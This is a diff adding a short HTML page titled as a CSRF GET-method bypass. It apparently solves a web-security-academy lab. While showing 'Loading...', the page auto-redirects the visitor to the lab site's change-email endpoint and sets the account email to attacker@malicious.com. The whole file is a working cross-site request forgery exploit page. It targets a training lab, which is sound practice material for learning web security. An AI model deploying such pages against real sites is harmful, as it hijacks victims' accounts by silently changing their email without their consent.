@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - GET Method Bypass</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    
+    <script>
+        // Automatically redirect to the GET request when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            window.location.href = 'https://0a8c00f7049b27c2816bde0d00e20018.web-security-academy.net/my-account/change-email?email=attacker@malicious.com';
+        });
+    </script>
+</body>
+</html>
